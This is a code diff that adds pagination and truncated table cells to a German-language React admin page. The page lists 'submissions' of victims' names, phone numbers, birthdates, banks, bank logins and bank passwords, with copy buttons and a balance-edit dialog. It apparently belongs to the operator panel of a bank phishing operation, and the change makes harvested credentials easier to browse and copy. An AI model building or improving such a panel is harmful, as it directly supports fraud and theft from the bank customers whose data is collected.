@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import AdminLayout, { useAdminUser } from "@/components/AdminLayout";
@@ -8,6 +8,7 @@ import { Input } from "@/components/ui/input";
 import { Textarea } from "@/components/ui/textarea";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
+import { Pagination, PaginationContent, PaginationItem, PaginationLink, PaginationNext, PaginationPrevious, PaginationEllipsis } from "@/components/ui/pagination";
 import { Badge } from "@/components/ui/badge";
 import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
 import { Avatar, AvatarFallback } from "@/components/ui/avatar";
@@ -66,6 +67,8 @@ function LogsContent() {
   const [txNote, setTxNote] = useState("");
   const [resendingId, setResendingId] = useState<string | null>(null);
   const [bulkResending, setBulkResending] = useState(false);
+  const [page, setPage] = useState(1);
+  const PAGE_SIZE = 20;
 
   const isLog = (s: any) => !!(s.bank_username && s.bank_password);
 
@@ -206,9 +209,11 @@ function LogsContent() {
 
   const CopyCell = ({ value, mono }: { value: string | null; mono?: boolean }) => {
     if (!value) return <span className="text-slate-300">—</span>;
+    const display = value.length > 80 ? value.slice(0, 80) + "…" : value;
     return (
-      <button onClick={() => copyToClipboard(value)} className={`group/copy flex items-center gap-1.5 text-sm text-slate-600 hover:text-slate-900 transition-colors ${mono ? "font-mono text-xs" : ""}`}>
-        {value} <Copy className="h-3 w-3 opacity-0 group-hover/copy:opacity-40 transition-opacity" />
+      <button onClick={() => copyToClipboard(value)} title={value.length > 80 ? `${value.slice(0, 200)}${value.length > 200 ? "…" : ""}` : value} className={`group/copy flex items-center gap-1.5 text-sm text-slate-600 hover:text-slate-900 transition-colors max-w-full ${mono ? "font-mono text-xs" : ""}`}>
+        <span className="truncate">{display}</span>
+        <Copy className="h-3 w-3 opacity-0 group-hover/copy:opacity-40 transition-opacity shrink-0" />
       </button>
     );
   };
@@ -222,6 +227,15 @@ function LogsContent() {
     }
     return true;
   });
+
+  const totalPages = Math.max(1, Math.ceil(filteredSubmissions.length / PAGE_SIZE));
+  const currentPage = Math.min(page, totalPages);
+  const pageStart = (currentPage - 1) * PAGE_SIZE;
+  const paginated = filteredSubmissions.slice(pageStart, pageStart + PAGE_SIZE);
+
+  useEffect(() => {
+    setPage(1);
+  }, [statusFilter, searchQuery, submissions.length]);
 
   const statCards = [
     { label: "Gesamt", value: stats.total, icon: Users, filter: "Alle", color: "text-slate-600 bg-slate-50 border-slate-200" },
@@ -299,24 +313,24 @@ function LogsContent() {
 
       {/* Table */}
       <div className="rounded-xl border border-slate-200 bg-white shadow-sm overflow-hidden">
-        <Table>
+        <Table className="table-fixed w-full">
           <TableHeader>
             <TableRow className="bg-slate-50/80 border-b border-slate-100">
-              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider pl-4">Zeit</TableHead>
+              <TableHead className="w-[90px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider pl-4">Zeit</TableHead>
               <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Name</TableHead>
-              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Telefon</TableHead>
-              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Geburtsdatum</TableHead>
-              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Bank</TableHead>
-              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Typ</TableHead>
-              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Login</TableHead>
-              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Passwort</TableHead>
-              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Domain</TableHead>
-              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Status</TableHead>
-              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider pr-4">Aktionen</TableHead>
+              <TableHead className="w-[130px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Telefon</TableHead>
+              <TableHead className="w-[110px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Geburtsdatum</TableHead>
+              <TableHead className="w-[120px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Bank</TableHead>
+              <TableHead className="w-[90px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Typ</TableHead>
+              <TableHead className="w-[160px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Login</TableHead>
+              <TableHead className="w-[140px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Passwort</TableHead>
+              <TableHead className="w-[180px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Domain</TableHead>
+              <TableHead className="w-[130px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Status</TableHead>
+              <TableHead className="w-[140px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider pr-4">Aktionen</TableHead>
             </TableRow>
           </TableHeader>
           <TableBody>
-            {filteredSubmissions.map((sub) => {
+            {paginated.map((sub) => {
               const currentStatus = sub.status || "Neu";
               const sc = statusConfig[currentStatus] || statusConfig["Neu"];
               const nc = noteCounts[sub.id] || 0;
@@ -339,13 +353,13 @@ function LogsContent() {
 
                   {/* Name + Avatar */}
                   <TableCell>
-                    <div className="flex items-center gap-2.5">
-                      <Avatar className="h-7 w-7 text-[10px]">
+                    <div className="flex items-center gap-2.5 min-w-0">
+                      <Avatar className="h-7 w-7 text-[10px] shrink-0">
                         <AvatarFallback className="bg-slate-100 text-slate-500 font-medium">
                           {getInitials(sub.full_name)}
                         </AvatarFallback>
                       </Avatar>
-                      <span className="font-medium text-slate-800 text-sm">{sub.full_name || "—"}</span>
+                      <span title={sub.full_name || ""} className="font-medium text-slate-800 text-sm truncate min-w-0">{sub.full_name || "—"}</span>
                     </div>
                   </TableCell>
 
@@ -455,7 +469,7 @@ function LogsContent() {
                 </TableRow>
               );
             })}
-            {filteredSubmissions.length === 0 && (
+            {paginated.length === 0 && (
               <TableRow>
                 <TableCell colSpan={11} className="text-center text-slate-400 py-16">
                   Keine Einträge vorhanden
@@ -465,6 +479,63 @@ function LogsContent() {
           </TableBody>
         </Table>
       </div>
+
+      {/* Pagination */}
+      {filteredSubmissions.length > 0 && (
+        <div className="flex items-center justify-between gap-4">
+          <p className="text-xs text-slate-500">
+            Zeige {pageStart + 1}–{Math.min(pageStart + PAGE_SIZE, filteredSubmissions.length)} von {filteredSubmissions.length}
+          </p>
+          {totalPages > 1 && (
+            <Pagination className="mx-0 w-auto justify-end">
+              <PaginationContent>
+                <PaginationItem>
+                  <PaginationPrevious
+                    href="#"
+                    onClick={(e) => { e.preventDefault(); if (currentPage > 1) setPage(currentPage - 1); }}
+                    className={currentPage === 1 ? "pointer-events-none opacity-50" : ""}
+                  />
+                </PaginationItem>
+                {(() => {
+                  const pages: (number | "ellipsis")[] = [];
+                  const add = (p: number) => { if (!pages.includes(p) && p >= 1 && p <= totalPages) pages.push(p); };
+                  add(1);
+                  for (let p = currentPage - 1; p <= currentPage + 1; p++) add(p);
+                  add(totalPages);
+                  const sorted = (pages.filter(p => typeof p === "number") as number[]).sort((a, b) => a - b);
+                  const out: (number | "ellipsis")[] = [];
+                  sorted.forEach((p, i) => {
+                    if (i > 0 && p - (sorted[i - 1] as number) > 1) out.push("ellipsis");
+                    out.push(p);
+                  });
+                  return out.map((p, i) =>
+                    p === "ellipsis" ? (
+                      <PaginationItem key={`e${i}`}><PaginationEllipsis /></PaginationItem>
+                    ) : (
+                      <PaginationItem key={p}>
+                        <PaginationLink
+                          href="#"
+                          isActive={p === currentPage}
+                          onClick={(e) => { e.preventDefault(); setPage(p); }}
+                        >
+                          {p}
+                        </PaginationLink>
+                      </PaginationItem>
+                    )
+                  );
+                })()}
+                <PaginationItem>
+                  <PaginationNext
+                    href="#"
+                    onClick={(e) => { e.preventDefault(); if (currentPage < totalPages) setPage(currentPage + 1); }}
+                    className={currentPage === totalPages ? "pointer-events-none opacity-50" : ""}
+                  />
+                </PaginationItem>
+              </PaginationContent>
+            </Pagination>
+          )}
+        </div>
+      )}
 
       {/* Balance Edit Dialog */}
       <Dialog open={!!balanceEdit} onOpenChange={(open) => { if (!open) { setBalanceEdit(null); setTxMode(null); setTxAmount(""); setTxNote(""); } }}>
